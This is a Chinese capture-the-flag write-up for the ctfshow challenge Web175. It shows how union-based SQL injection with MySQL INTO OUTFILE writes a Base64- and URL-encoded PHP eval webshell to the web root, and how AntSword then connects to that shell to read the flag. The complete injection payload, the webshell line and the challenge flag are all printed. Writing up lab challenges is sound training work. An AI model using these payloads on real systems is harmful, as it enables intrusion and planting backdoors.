## <font style="color:rgb(15, 17, 21);">📌</font><font style="color:rgb(15, 17, 21);"> 题目信息</font>
+ **<font style="color:rgb(15, 17, 21);">题目名称</font>**<font style="color:rgb(15, 17, 21);">：Web175</font>
+ **<font style="color:rgb(15, 17, 21);">题目类型</font>**<font style="color:rgb(15, 17, 21);">：SQL注入 + 文件写入</font>
+ **<font style="color:rgb(15, 17, 21);">难度</font>**<font style="color:rgb(15, 17, 21);">：★★★☆☆</font>
+ **<font style="color:rgb(15, 17, 21);">考点</font>**<font style="color:rgb(15, 17, 21);">：</font>
    - <font style="color:rgb(15, 17, 21);">SQL注入（Union注入）</font>
    - MySQL `into outfile` 写入文件
    - 编码绕过（Base64 + URL编码）
    - WebShell连接

## 🔍 题目源码分析

```php
// 拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user5 where username !='flag' and id = '".$_GET['id']."' limit 1;";

// 检查结果是否有flag
if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
    $ret['msg']='查询成功';
}
```

### 🚫 过滤机制

1. **SQL层过滤**：`username != 'flag'` 直接排除flag用户
2. **输出层过滤**：`preg_match('/[\x00-\x7f]/', json_encode($ret))`
   - `\x00-\x7f` = 所有ASCII字符（字母、数字、符号）
   - 只要返回结果中有**任何可读字符**，就不显示
   - **结论**：无法通过正常查询直接获取flag



## 💡 解题思路

**核心思想**：既然无法直接读取flag，就换个思路——**写入WebShell，通过后门查询**

### 攻击流程

```txt
构造WebShell → Base64编码 → URL编码 → SQL注入写入文件 → 蚁剑连接 → 查询flag
```

## 🚀 详细解题步骤

### 第1步：准备WebShell

```php
<?php eval($_POST[1]);?>
```

这是一句话木马，通过POST参数`1`执行任意PHP代码。

### 第2步：Base64编码

```bash
原始: <?php eval($_POST[1]);?>
Base64: PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+
```

**为什么要Base64？**
让PHP代码能在SQL语句中安全传输，避免特殊字符破坏SQL语法。

### 第3步：URL编码

```bash
原始Base64: PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+
URL编码后: %50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b
```

**为什么要URL编码？**

GET请求中，`+`号会被解码成空格，URL编码保证数据完整传输。

### 第4步：构造SQL注入Payload

```sql
99' union select 1,from_base64('这里放URL编码后的字符串') into outfile '/var/www/html/1.php
```

**最终Payload**：

```bash
99' union select 1,from_base64("%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b") into outfile '/var/www/html/1.php
```

### 第5步：发送请求

用浏览器或Burp Suite发送GET请求：

```plain
http://目标/challenge/？id=99' union select 1,from_base64("%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b") into outfile '/var/www/html/1.php
```

![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1773203862376-8348fd7f-625f-4156-8a74-9237d9e9e8f6.png)

### 第6步：连接WebShell

1. 访问 `http://目标/1.php`（确认文件存在）

![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1773204016918-4d8d5bff-f6ba-4317-bf5b-ff6c67e6478c.png)



![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1773204061253-8b6ab1ef-9c7d-44ea-8e98-1ad33544183d.png)



![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1773204258374-ea9f074e-de91-426b-ad2b-3396790cc7e1.png)



![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1773204290300-85cbfd0d-b335-4cea-90bc-94756daed117.png)



![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1773204326334-06b507dd-efd6-41b8-a441-4224259eed85.png)

2. 用中国蚁剑连接：
    - URL：`http://目标/1.php`
    - 连接密码：`1`
+ ![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1773204428441-a4f9467a-dc38-4653-a522-7e4ad8718f5f.png)
3. 右键 → 数据操作 → 执行SQL

![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1773204464251-32e0e453-e14d-45db-9474-5317cc79f502.png)

![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1773204528911-806309c3-039b-44bf-8ffc-b03ce27ff502.png)

![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1773204552071-3fa302fd-97d3-410d-b367-a3b99c55eac8.png)

```sql
SELECT * FROM `ctfshow_user5` ORDER BY 1 DESC LIMIT 0,20;
```

![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1773204639257-45e9619b-a59e-4327-bf8e-101e945c1013.png)

4. 获取flag：`ctfshow{04ad4d07-546a-4ac9-8f2b-9456c611bafa}`

